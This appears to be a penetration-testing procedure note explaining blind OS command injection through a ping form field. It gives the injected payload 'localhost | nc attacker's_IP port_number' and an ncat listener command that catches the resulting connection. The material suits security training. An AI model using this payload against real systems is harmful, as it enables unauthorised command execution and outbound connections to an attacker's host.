---
id: e294ab3c-b314-4725-b328-c149844f14d4
name: Blind OS Command Injection
type: procedure
verified: true
submitted: true
created_at: '2020-08-01T17:19:30.894663+00:00'
updated_at: '2023-05-26T18:10:02.756985+00:00'
commands:
- '[[ncat reverse shell output]]'
- '[[ncat windows on listening mode on port 9999]]'
---

# Blind OS Command Injection

**Status**: ✓ Verified

## Summary

In blind OS injection, an attacker cannot see the response to the payload  on the same page. An attacker will set up a listening on a port and craft the payload  accordingly to get response on the listening port number. 

## Description

# Description

In blind OS injection, an attacker cannot see the response to the *payload * on the same page. An attacker will set up a listening on a port and craft the *payload  *accordingly to get response on the listening port number.

# Instructions

# 

1. Insert *localhost  *in the textbox as shown. Upon clicking on ping, the response should be displayed on the screen.

2. As can be seen , no response is displayed on the page.

3.Inject the *payload *as shown below.

*payload : localhost | nc attacker's_IP  port_number *

4.Before submitting the *payload *in step 3 *, *start* ncat *in a listening mode on port_number 9999.

**Command** ([[ncat windows on listening mode on port 9999]]):

```bash
ncat -lvp 9999
```

5. Once the request is submitted in step3 , a connection will be established with application server in *ncat.*

**Command** ([[ncat windows on listening mode on port 9999]]):

```bash
ncat -lvp 9999
```

## Commands Used

- [[ncat reverse shell output]]
- [[ncat windows on listening mode on port 9999]]
